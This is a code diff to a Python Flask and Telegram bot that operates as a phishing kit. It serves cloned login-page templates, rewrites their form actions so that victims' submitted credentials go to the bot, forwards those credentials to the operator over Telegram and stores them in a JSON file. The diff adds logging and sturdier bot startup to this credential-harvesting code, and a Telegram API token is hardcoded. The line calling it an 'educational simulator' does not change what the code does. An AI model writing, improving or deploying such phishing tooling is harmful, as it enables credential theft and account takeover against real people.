@@ -1,17 +1,27 @@
 # Import necessary libraries
-from flask import Flask, request, send_from_directory  # Web framework for serving pages
-import threading  # For running Flask and Telegram bot concurrently
-import telebot  # Python Telegram bot API
-from telebot import types  # For Telegram UI elements like buttons
-import os  # For file and directory operations
-import json  # For storing credentials in JSON format
-from datetime import datetime  # For timestamps
-import shutil  # For copying files
+from flask import Flask, request, send_from_directory
+import threading
+import telebot
+from telebot import types
+import os
+import json
+from datetime import datetime
+import shutil
+import time
+import logging
+
+# Set up logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
 
 # Telegram bot API token
 API_TOKEN = '8110718903:AAFlE-nSLZZPXUSmkYdEmCc69ZvIXp7iy_k'
 bot = telebot.TeleBot(API_TOKEN)  # Initialize Telegram bot
 app = Flask(__name__)  # Initialize Flask web application
+
+# Global variables
+bot_polling_thread = None
+is_bot_running = False
 
 # JSON file to store all credentials
 CREDS_FILE = 'captured_credentials.json'
@@ -40,8 +50,14 @@ def home():
     return "🤖 Bot is running on Flask!"
 
 
+# Route to check bot status
+@app.route('/status')
+def status():
+    global is_bot_running
+    return f"Bot running: {is_bot_running}, Flask is active"
+
+
 # Route to serve the phishing page to victims
-# Each user gets their own unique phishing page based on user_id
 @app.route('/phish/<user_id>', methods=['GET'])
 def serve_phish_page(user_id):
     folder = f"phished_pages/{user_id}"
@@ -51,7 +67,6 @@ def serve_phish_page(user_id):
 
 
 # Route to handle form submissions from phishing pages
-# Captures credentials and forwards them to the attacker via Telegram
 @app.route('/submit/<user_id>', methods=['POST'])
 def capture_creds(user_id):
     # Extract all form fields submitted by victim
@@ -64,8 +79,11 @@ def capture_creds(user_id):
     # Format credentials as text for Telegram message
     msg = "\n".join(f"{k}: {v}" for k, v in creds.items())
 
-    # Send credentials to attacker via Telegram
-    bot.send_message(user_id, f"🛑 Credentials Captured:\n\n{msg}")
+    try:
+        # Send credentials to attacker via Telegram
+        bot.send_message(user_id, f"🛑 Credentials Captured:\n\n{msg}")
+    except Exception as e:
+        logger.error(f"Error sending Telegram message: {e}")
 
     # Save credentials to JSON file
     save_credentials(user_id, creds)
@@ -94,7 +112,7 @@ def save_credentials(user_id, creds):
         json.dump(all_creds, f, indent=2)
 
 
-# Command handler for /start and /help - Introduces the bot and shows commands
+# Command handler for /start and /help
 @bot.message_handler(commands=['start', 'help'])
 def send_welcome(message):
     bot.reply_to(message, (
@@ -106,7 +124,7 @@ def send_welcome(message):
     ))
 
 
-# Command handler for /info - Shows information about the bot
+# Command handler for /info
 @bot.message_handler(commands=['info'])
 def send_info(message):
     bot.reply_to(message, "Educational phishing simulator.")
@@ -139,7 +157,7 @@ def view_history(message):
         bot.send_message(user_id, "📭 No credentials history found.")
 
 
-# Command handler for /fish - Displays a menu of website templates to choose from
+# Command handler for /fish
 @bot.message_handler(commands=['fish'])
 def send_fish_menu(message):
     # Create a custom keyboard with website options
@@ -149,8 +167,7 @@ def send_fish_menu(message):
     bot.send_message(message.chat.id, "📄 Choose a phishing template:", reply_markup=markup)
 
 
-# Message handler for template selection - Processes the chosen website
-# Creates a customized phishing page and returns a URL to share with victims
+# Message handler for template selection
 @bot.message_handler(func=lambda msg: msg.text in TEMPLATES)
 def handle_template_selection(message):
     template = message.text
@@ -163,7 +180,6 @@ def handle_template_selection(message):
     os.makedirs(output_path, exist_ok=True)
 
     if os.path.exists(template_path):
-        # Copy template files to user's directory
         try:
             # Copy the template directory contents to the user's directory
             template_dir = f"Templates/{template}"
@@ -193,13 +209,13 @@ def modify_html_form(html_path, user_id):
             content = f.read()
 
         # Replace form action with our submission URL
-        # This is a simple replace - in real scenarios, you might need more robust HTML parsing
         modified = content.replace('action="', f'action="/submit/{user_id}"')
 
         with open(html_path, 'w', encoding='utf-8') as f:
             f.write(modified)
         return True
-    except Exception:
+    except Exception as e:
+        logger.error(f"Error modifying HTML: {e}")
         return False
 
 
@@ -209,12 +225,29 @@ def fallback(m):
     bot.reply_to(m, "❓ Unknown command. Use /start")
 
 
-# Function to run the Telegram bot in the background
-def run_bot():
-    bot.infinity_polling()
+# Function to safely run the Telegram bot with error handling
+def run_bot_with_error_handling():
+    global is_bot_running
+
+    if is_bot_running:
+        logger.warning("Bot is already running, skipping...")
+        return
+
+    is_bot_running = True
+    logger.info("Starting bot polling...")
+
+    try:
+        bot.remove_webhook()
+        time.sleep(0.5)  # Give time for webhook to be removed
+        bot.infinity_polling(timeout=60, long_polling_timeout=30)
+    except Exception as e:
+        logger.error(f"Bot polling error: {e}")
+    finally:
+        is_bot_running = False
+        logger.info("Bot polling has stopped")
 
 
-# Main entry point - Starts both the Flask web server and Telegram bot
+# Main entry point
 if __name__ == '__main__':
     # Initialize credentials file
     initialize_creds_file()
@@ -222,11 +255,20 @@ if __name__ == '__main__':
     # Create directories if they don't exist
     os.makedirs("phished_pages", exist_ok=True)
 
-    # Start Telegram bot in a separate thread
-    threading.Thread(target=run_bot).start()
+    # Try to stop any existing bot instances
+    try:
+        bot.remove_webhook()
+        time.sleep(1)  # Give time for webhook to be removed
+    except Exception as e:
+        logger.error(f"Error removing webhook: {e}")
+
+    # Start the bot in a separate thread with better error handling
+    bot_polling_thread = threading.Thread(target=run_bot_with_error_handling)
+    bot_polling_thread.daemon = True  # Make thread die when main thread exits
+    bot_polling_thread.start()
 
     # Get port from environment variable (for Render compatibility)
-    port = int(os.environ.get("PORT", 5001))
+    port = int(os.environ.get("PORT", 5000))
 
     # Start Flask web server
     app.run(host='0.0.0.0', port=port)
